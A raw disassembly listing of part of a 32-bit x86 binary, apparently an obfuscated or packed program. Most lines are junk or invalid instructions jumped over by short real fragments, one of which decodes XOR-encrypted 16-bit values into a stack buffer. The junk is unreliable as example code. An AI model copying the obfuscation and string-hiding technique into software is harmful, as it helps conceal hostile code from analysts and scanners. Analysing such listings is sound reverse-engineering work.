  4031f8:	in     eax,0x71
  4031fa:	mov    dh,0xc7
  4031fc:	xor    DWORD PTR [eax],ebp
  4031fe:	fdivr  DWORD PTR [edx+eax*4-0x3f92546d]
  403205:	sahf   
  403206:	jae    0x403255
  403208:	stos   DWORD PTR es:[edi],eax
  403209:	fwait
  40320a:	jmp    0x9c85:0x31f845c7
  403211:	clc    
  403212:	mov    DWORD PTR [ebp-0x10],0xf89c8532
  403219:	or     DWORD PTR ds:0x42ec6f,ecx
  40321f:	mov    eax,DWORD PTR [ebp-0x8]
  403222:	movzx  ecx,WORD PTR ds:0x42ec4b
  403229:	adc    DWORD PTR ds:0x430357,ecx
  40322f:	mov    ecx,0x7510854
  403234:	sub    DWORD PTR ds:0x42e648,0x77ef
  40323e:	push   esi
  40323f:	xor    eax,ecx
  403241:	and    DWORD PTR ds:0x4302e1,0x33b1
  40324b:	jmp    0x403418
  403250:	inc    ecx
  403251:	jp     0x4031f4
  403253:	cs popa 
  403255:	mov    ch,0x51
  403257:	jno    0x403251
  403259:	(bad)  
  40325b:	pop    edi
  40325c:	jae    0x403228
  40325e:	shl    BYTE PTR [ecx],1
  403260:	rcl    BYTE PTR [esi],cl
  403262:	jle    0x4032e2
  403264:	scas   al,BYTE PTR es:[edi]
  403265:	jg     0x4032e5
  403267:	jle    0x403224
  403269:	xchg   ecx,eax
  40326a:	jbe    0x40325f
  40326c:	and    eax,0xecfa0e07
  403271:	test   BYTE PTR [ecx+0x27eff35b],0x2c
  403278:	inc    esi
  403279:	inc    ebx
  40327a:	sbb    al,0xcf
  40327c:	xor    al,BYTE PTR [edx+0x73]
  40327f:	scas   al,BYTE PTR es:[edi]
  403280:	enter  0xf663,0x22
  403284:	arpl   WORD PTR [edx],bp
  403286:	clc    
  403287:	test   BYTE PTR [ecx],bh
  403289:	sbb    eax,0xd6001e0a
  40328e:	clc    
  40328f:	inc    edx
  403290:	addr16 push esi
  403292:	aad    0x82
  403294:	test   al,0xd9
  403296:	dec    ecx
  403297:	in     eax,dx
  403298:	inc    eax
  403299:	inc    esi
  40329a:	xchg   DWORD PTR [ecx-0xdcc4c26],edx
  4032a0:	pop    ebx
  4032a1:	sub    DWORD PTR [edx],0x44
  4032a4:	mov    edi,0xc7184816
  4032a9:	ret    
  4032aa:	je     0x403237
  4032ac:	imul   edx,esi,0xd24768bf
  4032b2:	(bad)  
  4032b3:	std    
  4032b4:	in     eax,0x74
  4032b6:	jp     0x403271
  4032b8:	mov    ah,0xc6
  4032ba:	in     eax,0xb8
  4032bc:	mov    esp,0x51b77931
  4032c1:	cs jbe 0x403289
  4032c4:	(bad)  
  4032c5:	xchg   ebp,eax
  4032c6:	xor    al,0x7c
  4032c8:	es mov cl,0x5e
  4032cb:	fiadd  WORD PTR [esi+0x49]
  4032ce:	sbb    al,0x3
  4032d0:	popa   
  4032d1:	aaa    
  4032d2:	sbb    al,0xd2
  4032d4:	sar    DWORD PTR [edx-0x5d],1
  4032d7:	fistp  DWORD PTR [eax]
  4032d9:	pop    es
  4032da:	pop    esi
  4032db:	out    dx,eax
  4032dc:	shr    ebp,1
  4032de:	sub    al,0xd9
  4032e0:	adc    al,dh
  4032e2:	aas    
  4032e3:	cmc    
  4032e4:	int3   
  4032e5:	sbb    dh,al
  4032e7:	jl     0x403367
  4032e9:	cmp    edi,DWORD PTR [esp+ebx*8+0x505b85c8]
  4032f0:	dec    eax
  4032f1:	rcl    DWORD PTR [ebx],0x5a
  4032f4:	dec    esp
  4032f5:	push   esp
  4032f6:	imul   esp,ebp,0xf1021bb0
  4032fc:	cwde   
  4032fd:	(bad)  
  4032fe:	mov    al,0x1d
  403300:	jl     0x40334d
  403302:	pushf  
  403303:	or     eax,0x2cb51fe8
  403308:	or     bh,dh
  40330a:	adc    ah,BYTE PTR [esi+0x78da116a]
  403310:	aas    
  403311:	les    esi,FWORD PTR [eax-0xa7db3fe]
  403317:	sar    DWORD PTR [edi-0x4c],cl
  40331a:	mov    dl,0x4f
  40331c:	ins    BYTE PTR es:[edi],dx
  40331d:	in     al,0x4e
  40331f:	add    eax,0x568e4cd9
  403324:	adc    al,0xa1
  403326:	pop    edx
  403327:	fistp  QWORD PTR [ebx+0x703ca3c4]
  40332d:	inc    ecx
  40332e:	es fwait
  403330:	mov    al,0x9f
  403332:	push   edx
  403333:	daa    
  403334:	dec    edi
  403335:	in     al,0x41
  403337:	mov    bh,0xda
  403339:	rcl    DWORD PTR [edx+eiz*1+0x76987ec1],1
  403340:	in     al,dx
  403341:	inc    edx
  403342:	shl    DWORD PTR [ecx+0xe539c67],cl
  403348:	jbe    0x403385
  40334a:	jg     0x403397
  40334c:	(bad)  
  40334d:	cmc    
  40334e:	int    0xeb
  403350:	jmp    0x54a:0x24d99848
  403357:	imul   edx,ecx,0x44292976
  40335d:	ins    BYTE PTR es:[edi],dx
  40335e:	sub    BYTE PTR [eax],0xaa
  403361:	(bad)  
  403362:	xor    DWORD PTR [edx+0x5e],ebx
  403365:	bound  ebx,QWORD PTR [esi]
  403367:	aaa    
  403368:	outs   dx,BYTE PTR ds:[esi]
  403369:	sbb    eax,0x5e72ea0e
  40336e:	mov    ch,cl
  403370:	lods   eax,DWORD PTR ds:[esi]
  403371:	ins    BYTE PTR es:[edi],dx
  403372:	loop   0x403360
  403374:	mov    ds:0x5f25fbbb,al
  403379:	sub    bl,BYTE PTR [ecx]
  40337b:	adc    BYTE PTR [ebp+ebx*2+0x6fbe68f5],bl
  403382:	and    ebx,DWORD PTR es:[ebx+0x5]
  403386:	call   0x9570:0xa8a068b6
  40338d:	test   eax,0xafeb4bf3
  403392:	mov    BYTE PTR [ebx],dl
  403394:	mov    eax,ds:0x38a72034
  403399:	sub    DWORD PTR [eax*2-0x5a38bcc0],esi
  4033a0:	retf   0x2cb2
  4033a3:	(bad)  
  4033a4:	push   esi
  4033a5:	push   ebx
  4033a6:	fwait
  4033a7:	push   ss
  4033a8:	push   ds
  4033a9:	int3   
  4033aa:	test   DWORD PTR [esi-0x2910efcb],esi
  4033b0:	mov    ch,0x7c
  4033b2:	adc    eax,0x26f5ea8
  4033b7:	or     BYTE PTR [ebp-0x36],0xc2
  4033bb:	dec    edi
  4033bc:	mov    al,ds:0xd029db2b
  4033c1:	loope  0x4033df
  4033c3:	xor    eax,0xda130650
  4033c8:	jnp    0x40342a
  4033ca:	mov    esp,0x6143c642
  4033cf:	mov    edi,0x93762644
  4033d4:	stos   DWORD PTR es:[edi],eax
  4033d5:	xor    dl,bl
  4033d7:	aas    
  4033d8:	sub    BYTE PTR [esi],dh
  4033da:	into   
  4033db:	or     ecx,edx
  4033dd:	pop    DWORD PTR [ebp-0x31]
  4033e0:	jge    0x403441
  4033e2:	mov    al,ds:0xc3d42201
  4033e7:	idiv   BYTE PTR ds:0x7a6050c6
  4033ed:	mov    al,BYTE PTR [esi]
  4033ef:	and    al,0xf4
  4033f1:	pop    edx
  4033f2:	addr16 (bad) 
  4033f4:	sti    
  4033f5:	es daa 
  4033f7:	push   0x72
  4033f9:	or     eax,0x726107a8
  4033fe:	xchg   ebx,eax
  4033ff:	das    
  403400:	call   0x19920b66
  403405:	xchg   esi,eax
  403406:	(bad)  
  403407:	nop
  403408:	repz jmp 0x4157:0x24f66536
  403410:	lods   al,BYTE PTR ds:[esi]
  403411:	push   ebp
  403412:	retf   
  403413:	das    
  403414:	and    BYTE PTR [ebx+0x15],ch
  403417:	dec    edx
  403418:	mov    esi,0x32729b
  40341d:	neg    DWORD PTR ds:0x4302d9
  403423:	add    eax,esi
  403425:	jmp    0x403432
  40342a:	mov    dl,BYTE PTR [ebp-0x1]
  40342d:	mov    BYTE PTR [ebp+eax*1-0x58],dl
  403431:	inc    eax
  403432:	cmp    eax,0x40
  403435:	jb     0x40342a
  40343b:	mov    edx,DWORD PTR [ebp-0x8]
  40343e:	mov    eax,DWORD PTR [ebp-0xc]
  403441:	jmp    0x40360e
  403446:	mov    ds:0x9b821f26,eax
  40344b:	and    DWORD PTR [ebx-0x712401d9],0xffffff90
  403452:	test   al,0xc0
  403454:	cmp    al,0x30
  403456:	add    dl,BYTE PTR [esi+edi*2]
  403459:	jle    0x403409
  40345b:	jg     0x4034db
  40345d:	jle    0x4033eb
  40345f:	mov    bh,0x26
  403461:	ins    DWORD PTR es:[edi],dx
  403462:	retf   
  403463:	mov    ch,0xc0
  403465:	jmp    0x83b1:0xb5386d3
  40346c:	mov    bl,0xbe
  40346e:	in     al,0x31
  403470:	xor    al,0xa5
  403472:	xor    ebp,DWORD PTR [ebx+0x42]
  403475:	loopne 0x4034c3
  403477:	xor    eax,0xd81ae358
  40347c:	and    BYTE PTR [ecx+0x4],cl
  40347f:	xor    DWORD PTR [edi],0x21996bba
  403485:	xor    DWORD PTR [edi],ecx
  403487:	sbb    DWORD PTR [ebx-0x7f462471],ecx
  40348d:	jp     0x403411
  40348f:	js     0x4034a1
  403491:	arpl   WORD PTR [edx+0x6cffe7b4],dx
  403497:	xor    ch,BYTE PTR [edx]
  403499:	in     eax,dx
  40349a:	xchg   edx,eax
  40349b:	aad    0x85
  40349d:	sub    eax,ebx
  40349f:	push   esp
  4034a0:	jno    0x4034c7
  4034a2:	div    ebx
  4034a4:	and    esp,edi
  4034a6:	pop    edi
  4034a7:	idiv   ah
  4034a9:	xchg   ebx,eax
  4034aa:	fs dec ebp
  4034ac:	dec    ebx
  4034ad:	sbb    al,0xe4
  4034af:	aad    0x53
  4034b1:	sub    al,0x73
  4034b3:	add    eax,0x7bcf3a36
  4034b8:	mov    esp,0x415fb7c8
  4034bd:	leave  
  4034be:	(bad)  
  4034bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4034c0:	mov    cl,0x9b
  4034c2:	sbb    BYTE PTR [edi-0x5b],dl
  4034c5:	inc    eax
  4034c6:	stos   DWORD PTR es:[edi],eax
  4034c7:	pusha  
  4034c8:	adc    dl,0x8e
  4034cb:	test   BYTE PTR [ebp-0x7c],dl
  4034ce:	jnp    0x40352e
  4034d0:	scas   eax,DWORD PTR es:[edi]
  4034d1:	mov    dh,ah
  4034d3:	dec    edi
  4034d4:	enter  0x4ac0,0x6b
  4034d8:	loope  0x40347e
  4034da:	pop    esp
  4034db:	je     0x4034ec
  4034dd:	xor    eax,0x7d41d177
  4034e2:	iret   
  4034e3:	adc    BYTE PTR [ebx+0x7],bh
  4034e6:	xor    BYTE PTR [edx-0x7d81421],0xa4
  4034ed:	mov    dl,0x39
  4034ef:	xchg   esi,eax
  4034f0:	gs mov ch,0x8c
  4034f3:	ret    
  4034f4:	and    BYTE PTR [edi-0x12],0xd6
  4034f8:	test   eax,0x7e1bf264
  4034fd:	mov    edx,0xe4ec2e86
  403502:	cmc    
  403503:	mov    ds:0xb5570f69,al
  403508:	push   ebp
  403509:	and    eax,0x2e0b153c
  40350e:	cmc    
  40350f:	add    BYTE PTR [edi+0x34],dl
  403512:	ins    BYTE PTR es:[edi],dx
  403513:	call   0x79bd10df
  403518:	or     BYTE PTR [edx],cl
  40351a:	mov    eax,0x72cab280
  40351f:	js     0x40357d
  403521:	add    eax,0x44592a36
  403526:	add    DWORD PTR [eax+0x273675fd],0xfd72609e
  403530:	or     al,0x58
  403532:	pushf  
  403533:	or     eax,0xb9bd7ace
  403538:	aam    0x8e
  40353a:	(bad)  
  40353b:	mov    edx,0xbdc630eb
  403540:	add    ecx,edi
  403542:	mov    ah,0xda
  403544:	in     al,dx
  403545:	fisttp DWORD PTR [esi+0x40def684]
  40354b:	xor    DWORD PTR [ecx+ebx*2-0x6b],0x16818d27
  403553:	call   0x6cb4e44
  403558:	and    ebp,DWORD PTR [ecx+0x5f]
  40355b:	fdiv   st,st(4)
  40355d:	fcomp  QWORD PTR [edx]
  40355f:	jl     0x40351a
  403561:	add    edx,ebx
  403563:	push   ecx
  403564:	adc    al,0xa3
  403566:	lods   eax,DWORD PTR ds:[esi]
  403567:	rcr    al,1
  403569:	inc    eax
  40356a:	out    dx,eax
  40356b:	arpl   WORD PTR [eax+0x2a881cb],sp
  403571:	out    0xcc,eax
  403573:	add    DWORD PTR [esi+edx*2-0x51],esp
  403577:	ins    DWORD PTR es:[edi],dx
  403578:	stos   DWORD PTR es:[edi],eax
  403579:	ret    
  40357a:	or     edx,edx
  40357c:	fadd   DWORD PTR [esi+0x16]
  40357f:	dec    esi
  403580:	data16 xlat BYTE PTR ds:[ebx]
  403582:	xchg   esi,eax
  403583:	cmp    al,bl
  403585:	mov    bl,0x72
  403587:	cmp    edi,DWORD PTR ds:0xf684a822
  40358d:	loope  0x403534
  40358f:	out    dx,eax
  403590:	mov    bl,0xe0
  403592:	rcl    ecx,1
  403594:	pop    ss
  403595:	lods   al,BYTE PTR ds:[esi]
  403596:	dec    ebx
  403597:	sub    al,0xba
  403599:	mov    DWORD PTR [ebx],esp
  40359b:	mov    al,0xb2
  40359d:	or     al,dl
  40359f:	xor    eax,0xa4d80fb8
  4035a4:	or     DWORD PTR [eiz*8+0x74790155],edi
  4035ab:	jmp    0x403537
  4035ad:	shl    BYTE PTR [ebp+0x37],cl
  4035b0:	mov    cl,BYTE PTR [ecx-0x1]
  4035b3:	mov    eax,ds:0xcb7bc562
  4035b8:	ret    
  4035b9:	jno    0x40356c
  4035bb:	xchg   BYTE PTR [ebp+ebx*1+0x26],dl
  4035bf:	add    al,0x27
  4035c1:	cmp    al,BYTE PTR [edx+eiz*1-0x4b1c310d]
  4035c8:	jno    0x4035aa
  4035ca:	push   edi
  4035cb:	into   
  4035cc:	leave  
  4035cd:	inc    edi
  4035ce:	jns    0x4035e4
  4035d0:	mov    esi,0xe359f861
  4035d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4035d6:	xchg   ecx,eax
  4035d7:	xor    al,0x4e
  4035d9:	sbb    DWORD PTR [ecx-0x66],edi
  4035dc:	mov    eax,ds:0x3d98d2eb
  4035e1:	mov    cl,0x74
  4035e3:	in     al,0x29
  4035e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4035e6:	pop    ss
  4035e7:	std    
  4035e8:	xchg   edi,eax
  4035e9:	mov    al,ds:0xa7460bc7
  4035ee:	mov    esi,0x916bb65d
  4035f3:	or     esi,DWORD PTR [eax+esi*1]
  4035f6:	(bad)  
  4035f7:	sbb    BYTE PTR ds:0x7e9eaae6,dl
  4035fd:	idiv   esi
  4035ff:	mov    edi,0x6e767f4d
  403604:	pop    ebp
  403605:	add    edi,DWORD PTR ds:0x9085c3f7
  40360b:	sub    DWORD PTR ds:0x3d13308,ebp
  403611:	(bad)  
  403612:	cmp    edx,eax
  403614:	je     0x40365a
  40361a:	push   ebx
  40361b:	push   edi
  40361c:	mov    edi,DWORD PTR [ebp+0x8]
  40361f:	mov    eax,0x8a3c
  403624:	xor    ax,WORD PTR [edi+edx*4+0x2]
  403629:	mov    edi,0x3b02
  40362e:	add    ax,di
  403631:	movzx  eax,ax
  403634:	mov    DWORD PTR [ebp-0x14],eax
  403637:	mov    eax,DWORD PTR [ebp+0x8]
  40363a:	movzx  eax,WORD PTR [eax+edx*4]
  40363e:	xor    eax,0x8a3c
  403643:	add    eax,edi
  403645:	mov    edi,DWORD PTR [ebp-0x14]
  403648:	mov    BYTE PTR [ebp+edi*1-0x58],al
  40364c:	mov    eax,DWORD PTR [ebp-0xc]
  40364f:	inc    edx
  403650:	cmp    edx,eax
  403652:	jne    0x40361c
  403658:	pop    edi
  403659:	pop    ebx
  40365a:	mov    eax,DWORD PTR [ebp-0x8]
  40365d:	jmp    0x40382a
  403662:	jo     0x403624
  403664:	add    ecx,DWORD PTR [eax-0x1f8eb64d]
  40366a:	mov    esp,0xd13dd7c8
  40366f:	push   eax
  403670:	fnsave [esi+0x7e7e15b2]
  403676:	scas   al,BYTE PTR es:[edi]
  403677:	jg     0x4036f7
  403679:	jle    0x40364e
  40367b:	bound  ebp,QWORD PTR [edx]
  40367d:	mov    dh,0x89
  40367f:	pop    esp
  403680:	loop   0x403642
  403682:	cld    
  403683:	mov    edi,0xc028879
  403688:	out    0xff,al
  40368a:	hlt    
  40368b:	ss cli 
  40368d:	add    ecx,esi
  40368f:	push   eax
  403690:	push   esi
  403691:	fisttp QWORD PTR [esi+0x2d]
  403694:	mov    eax,ds:0x3489b97b
  403699:	in     eax,dx
  40369a:	popa   
  40369b:	push   edx
  40369c:	retf   0x453f
  40369f:	jbe    0x40362a
  4036a1:	or     BYTE PTR ds:0xc7c6cfa,bh
  4036a7:	mov    ebp,0x3203c64c
  4036ac:	mov    WORD PTR [edx-0x7b8c6f2e],gs
  4036b2:	jae    0x4036ca
  4036b4:	retf   
  4036b5:	leave  
  4036b6:	aad    0x93
  4036b8:	stos   BYTE PTR es:[edi],al
  4036b9:	nop
  4036ba:	outs   dx,DWORD PTR ds:[esi]
  4036bb:	push   ss
  4036bc:	ret    0xf428
  4036bf:	ins    DWORD PTR es:[edi],dx
  4036c0:	xor    eax,0x6e234468
  4036c5:	fwait
  4036c6:	xchg   ecx,eax
  4036c7:	in     al,dx
  4036c8:	xchg   ebx,eax
  4036c9:	std    
  4036ca:	shl    cl,0xf9
  4036cd:	dec    esp
  4036ce:	jp     0x4036de
  4036d0:	int3   
  4036d1:	or     al,0x3
  4036d3:	lahf   
  4036d4:	into   
  4036d5:	lds    edi,FWORD PTR [eax-0x5a1c8f5d]
  4036db:	pushf  
  4036dc:	rol    DWORD PTR [eax-0x67],1
  4036df:	mov    edi,0xc6f50376
  4036e4:	ffreep st(4)
  4036e6:	push   ss
  4036e7:	jmp    0xb336:0x847119f4
  4036ee:	in     eax,dx
  4036ef:	(bad)  
  4036f1:	xor    al,0x24
  4036f3:	imul   ebp,DWORD PTR [esi-0x29],0xfbadf369
  4036fa:	test   BYTE PTR [edx],bl
  4036fc:	aas    
  4036fd:	(bad)  
  4036fe:	fsubr  DWORD PTR [eax-0x6d04fceb]
  403704:	sub    esp,0x9c64d24d
  40370a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40370b:	dec    ecx
  40370c:	ja     0x403763
  40370e:	mov    cl,0xa3
  403710:	push   esp
  403711:	push   cs
  403712:	jnp    0x403723
  403714:	xor    eax,0x22d2cebf
  403719:	add    eax,0x7662e4ac
  40371e:	cwde   
  40371f:	int3   
  403720:	stos   BYTE PTR es:[edi],al
  403721:	shl    DWORD PTR [ebx-0x3f841563],cl
  403727:	pusha  
  403728:	ror    edx,cl
  40372a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40372b:	stc    
  40372c:	(bad)  
  40372d:	lock push ss
  40372f:	pushf  
  403730:	xor    eax,0xf8ffac6c
  403735:	out    dx,eax
  403736:	and    al,BYTE PTR [eax+eiz*2-0x16]
  40373a:	mov    eax,0x45ffe266
  40373f:	outs   dx,DWORD PTR ds:[esi]
  403740:	push   ebp
  403741:	popf   
  403742:	pop    ebx
  403743:	call   0x513e40b9
  403748:	ror    DWORD PTR [edx-0x5],0xe8
  40374c:	jle    0x40372b
  40374e:	imul   edx,ecx,0xb204ba75
  403754:	div    BYTE PTR [ecx+0x4d8b18a0]
  40375a:	test   BYTE PTR [esi-0x58],0x8f
  40375e:	daa    
  40375f:	iret   
  403760:	inc    edx
  403761:	lods   al,BYTE PTR ds:[esi]
  403762:	sar    BYTE PTR [eax-0x7e4e7fa9],cl
  403768:	lds    esp,FWORD PTR [eax]
  40376a:	jl     0x403767
  40376c:	inc    esp
  40376d:	aaa    
  40376e:	pop    ss
  40376f:	ret    
  403770:	rol    edx,0x64
  403773:	or     al,0x60
  403775:	mov    ecx,esi
  403777:	inc    ebp
  403778:	lods   eax,DWORD PTR ds:[esi]
  403779:	and    DWORD PTR [edi+edx*4-0x548b69b0],ecx
  403780:	pop    edi
  403781:	jnp    0x403766
  403783:	rol    DWORD PTR [eax],0xf0
  403786:	mov    ecx,0xb6d4519f
  40378b:	mov    bh,0xab
  40378d:	sub    ch,BYTE PTR [ebx-0xbfb8004]
  403793:	xor    cl,0x98
  403796:	shl    BYTE PTR [edi],cl
  403798:	je     0x403797
  40379a:	xchg   esp,eax
  40379b:	fistp  DWORD PTR [esi+eax*1-0x149aae65]
  4037a2:	dec    esi
  4037a3:	xor    eax,0xabfe5247
  4037a8:	jecxz  0x403777
  4037aa:	int    0xd0
  4037ac:	ds scas eax,DWORD PTR es:[edi]
  4037ae:	stos   BYTE PTR es:[edi],al
  4037af:	mov    al,0x20
  4037b1:	jg     0x40373c
  4037b3:	ins    BYTE PTR es:[edi],dx
  4037b4:	out    0xab,eax
  4037b6:	out    dx,al
  4037b7:	dec    esp
  4037b8:	out    dx,eax
  4037b9:	and    esi,DWORD PTR ds:0x692940b2
  4037bf:	lds    esi,FWORD PTR [esi-0x2e35e3bb]
  4037c5:	sub    al,0xf0
  4037c7:	cld    
  4037c8:	arpl   WORD PTR [ebx+0x5231b8db],sp
  4037ce:	loope  0x403766
  4037d0:	mov    ebp,0xf7ffa493
  4037d5:	mov    al,0x16
  4037d7:	out    dx,al
  4037d8:	sbb    dl,BYTE PTR [esi]
  4037da:	jmp    0x86f6f724
  4037df:	push   ebp
  4037e0:	adc    BYTE PTR ds:0x16c2886a,al
  4037e6:	outs   dx,DWORD PTR ds:[esi]
  4037e7:	hlt    
  4037e8:	div    BYTE PTR [ebx-0x2c]
  4037eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4037ec:	add    DWORD PTR [esi-0x1c],ebx
  4037ef:	pop    ebx
  4037f0:	adc    ch,BYTE PTR [esi-0x7b13a690]
  4037f6:	sbb    DWORD PTR [eax+0x65094a51],0xffffffcd
  4037fd:	and    dh,BYTE PTR [ebp+0x44a76110]
  403803:	dec    esi
  403804:	pop    ecx
  403805:	sar    BYTE PTR [edi],1
  403807:	dec    edx
  403808:	pcmpeqd mm3,QWORD PTR [eax-0x5a41cfde]
  40380f:	and    BYTE PTR [ebx+ecx*2],0xcb
  403813:	out    dx,eax
  403814:	pop    esp
  403815:	dec    esi
  403816:	sbb    BYTE PTR [ebp-0x4586f46d],bl
  40381c:	add    al,0x80
  40381e:	and    DWORD PTR [edi+ebp*1+0x63],esi
  403822:	mov    DWORD PTR [ebx],esp
  403824:	sbb    eax,0x8ac2740c
  403829:	pop    edx
  40382a:	mov    edx,DWORD PTR [ebp+0x10]
  40382d:	xor    eax,ecx
  40382f:	add    eax,esi
  403831:	jmp    0x4039fe
  403836:	jl     0x403858
  403838:	mov    cl,0xb0
  40383a:	mov    cl,0xb1
  40383c:	jge    0x4037ee
  40383e:	fld    QWORD PTR [edi]
  403840:	call   0xdb62cc23
  403845:	sti    
  403846:	loop   0x40385b
  403848:	jle    0x4038c8
  40384a:	scas   al,BYTE PTR es:[edi]
  40384b:	jg     0x4038cb
  40384d:	jle    0x4037f8
  40384f:	push   0x26
  403851:	(bad)  
  403852:	mov    esp,0xe5a37f7c
  403857:	imul   ecx,DWORD PTR [ebx-0x471bcd56],0x41879aff
  403861:	dec    eax
  403862:	cmp    ebx,ebx
  403864:	(bad)  
  403867:	stc    
  403868:	push   0xffffff92
  40386a:	mov    al,0xb7
  40386c:	cmp    al,0x44
  40386e:	das    
  40386f:	stc    
  403870:	cmp    eax,DWORD PTR [edi-0x7a]
  403873:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403874:	out    dx,eax
  403875:	in     eax,dx
  403876:	je     0x4038b0
  403878:	inc    edi
  403879:	pushf  
  40387a:	pop    ss
  40387b:	cmp    BYTE PTR [eax-0x1c],dl
  40387e:	jns    0x40382b
  403880:	hlt    
  403881:	sbb    al,BYTE PTR [esi+0x41]
  403884:	pop    ebx
  403885:	jo     0x4038e8
  403887:	test   eax,0x6b4df5a7
  40388c:	sbb    BYTE PTR [eax+eiz*8],0x26
  403890:	cmp    ebx,DWORD PTR ds:0xb7262be1
  403896:	mov    BYTE PTR [esi-0x57],cl
  403899:	rcr    ebp,cl
  40389b:	sar    BYTE PTR [ebp+0x221d378f],1
  4038a1:	addr16 out 0x72,eax
  4038a4:	and    al,BYTE PTR [eax+0x49]
  4038a7:	ins    DWORD PTR es:[edi],dx
  4038a8:	or     DWORD PTR [eax],esi
  4038aa:	xchg   ebx,eax
  4038ab:	xor    DWORD PTR [edi-0x23],esi
  4038ae:	retf   0xe636
  4038b1:	adc    eax,DWORD PTR [esi+0x21]
  4038b4:	pusha  
  4038b5:	addr16 jl 0x403928
  4038b8:	out    0x4e,al
  4038ba:	out    dx,al
  4038bb:	mov    ds:0xa4772e0,eax
  4038c0:	stos   DWORD PTR es:[edi],eax
  4038c1:	xchg   esp,eax
  4038c2:	push   eax
  4038c3:	mov    BYTE PTR [esi+0x36],bl
  4038c6:	popf   
  4038c7:	and    ebp,DWORD PTR [ebp+0x15e3d589]
  4038cd:	lock cmc 
  4038cf:	dec    edx
  4038d0:	dec    ebx
  4038d1:	xchg   edx,eax
  4038d2:	sahf   
  4038d3:	test   BYTE PTR gs:[edx+0x1b2d317b],cl
  4038da:	mov    WORD PTR [ebx],?
  4038dc:	or     BYTE PTR [ebx],dh
  4038de:	mov    eax,esi
  4038e0:	push   ebx
  4038e1:	sbb    bl,BYTE PTR [ecx+0x7]
  4038e4:	ins    BYTE PTR es:[edi],dx
  4038e5:	std    
  4038e6:	fld    DWORD PTR [edi-0x56]
  4038e9:	and    bl,BYTE PTR [edx+0x558328b7]
  4038ef:	jecxz  0x40391f
  4038f1:	mov    ebx,0x85ac68f0
  4038f6:	mov    edx,DWORD PTR [esi]
  4038f8:	jmp    0x40389c
  4038fa:	fisttp WORD PTR [edx]
  4038fc:	test   DWORD PTR [eax],esi
  4038fe:	das    
  4038ff:	inc    esp
  403900:	xor    dh,BYTE PTR [edx+eiz*1]
  403903:	fisttp QWORD PTR [edx]
  403905:	call   DWORD PTR [edi]
  403907:	fxch   st(5)
  403909:	mov    al,ds:0x1f4fb82c
  40390e:	daa    
  40390f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403910:	push   esi
  403911:	cmc    
  403912:	and    eax,0xa1ae2a7b
  403917:	add    DWORD PTR [eax],eax
  403919:	rcl    BYTE PTR [ecx],0x47
  40391c:	pop    ds
  40391d:	jne    0x403977
  40391f:	push   ss
  403920:	scas   al,BYTE PTR es:[edi]
  403921:	int3   
  403922:	and    al,0x81
  403924:	icebp  
  403925:	jle    0x4038eb
  403927:	xchg   ecx,eax
  403928:	pop    esi
  403929:	shr    BYTE PTR [ecx+0x44305390],0xf4
  403930:	mov    ch,0xbb
  403932:	in     eax,dx
  403933:	dec    ecx
  403934:	xchg   esi,eax
  403935:	(bad)  
  403936:	nop
  403937:	dec    esp
  403938:	mov    esp,0xb4d03d25
  40393d:	sahf   
  40393e:	dec    DWORD PTR [esi+0x28]
  403941:	xor    esi,edx
  403943:	add    DWORD PTR [edi],edx
  403945:	push   ebx
  403946:	inc    edx
  403947:	mov    eax,0x7421bf8d
  40394c:	add    dh,BYTE PTR [ecx+0x42]
  40394f:	test   DWORD PTR [ebx],edi
  403951:	test   BYTE PTR [ecx-0x1b],0x56
  403955:	repnz sbb DWORD PTR [ecx+0x3e2439cd],0x86d995c4
  403960:	xor    cl,dl
  403962:	inc    edi
  403963:	mul    dl
  403965:	imul   ebp,ecx,0xe
  403968:	stc    
  403969:	stos   BYTE PTR es:[edi],al
  40396a:	mov    bh,al
  40396c:	add    esi,edi
  40396e:	pop    es
  40396f:	xor    ecx,esp
  403971:	lods   al,BYTE PTR ds:[esi]
  403972:	sbb    ch,BYTE PTR [edi+0x6a1c2ef1]
  403978:	das    
  403979:	loope  0x403990
  40397b:	push   edi
  40397c:	hlt    
  40397d:	push   ds
  40397e:	ret    
  40397f:	fild   WORD PTR [ebx-0x3c]
  403982:	mov    gs:0xfd5a64f7,al
  403988:	push   esp
  403989:	sbb    bh,BYTE PTR [edx+0x36083d0a]
  40398f:	pushf  
  403990:	cwde   
  403991:	jmp    0x54f1812a
  403996:	stos   DWORD PTR es:[edi],eax
  403997:	fdivr  QWORD PTR [edx+eax*1-0x1d]
  40399b:	outs   dx,BYTE PTR ds:[esi]
  40399c:	adc    DWORD PTR [edi-0x65],eax
  40399f:	scas   al,BYTE PTR es:[edi]
  4039a0:	jl     0x403945
  4039a2:	(bad)  
  4039a3:	into   
  4039a4:	std    
  4039a5:	inc    eax
  4039a6:	fisttp QWORD PTR [ecx+eiz*1-0x80]
  4039aa:	fld    TBYTE PTR [ebx]
  4039ac:	les    ecx,FWORD PTR [esi]
  4039ae:	shl    BYTE PTR [edi],cl
  4039b0:	mov    edi,edi
  4039b2:	sub    DWORD PTR [esi],esi
  4039b4:	pusha  
  4039b5:	mov    esi,0x8dc29488
  4039ba:	stc    
  4039bb:	mov    ch,0x2b
  4039bd:	add    eax,edi
  4039bf:	daa    
  4039c0:	popf   
  4039c1:	jbe    0x403989
  4039c3:	in     al,0x8a
  4039c5:	(bad)  
  4039c6:	push   ebx
  4039c7:	dec    edx
  4039c8:	cld    
  4039c9:	jbe    0x403984
  4039cb:	je     0x403997
  4039cd:	or     DWORD PTR [ecx-0x7fe99c9f],esp
  4039d3:	clc    
  4039d4:	jmp    0x15cb66c3
  4039d9:	jl     0x403a01
  4039db:	mov    al,0xc1
  4039dd:	mov    esp,0x585559bf
  4039e2:	out    0x3e,al
  4039e4:	nop
  4039e5:	nop
  4039e6:	iret   
  4039e7:	(bad)  [ecx-0x78]
  4039ea:	sahf   
  4039eb:	pop    es
  4039ec:	mov    ecx,0x826ecec4
  4039f1:	push   edx
  4039f2:	pop    es
  4039f3:	xchg   DWORD PTR [eax],ecx
  4039f5:	call   FWORD PTR [eax-0x64]
  4039f8:	xor    eax,0xdc1387c8
  4039fd:	stc    
  4039fe:	mov    DWORD PTR [edx],eax
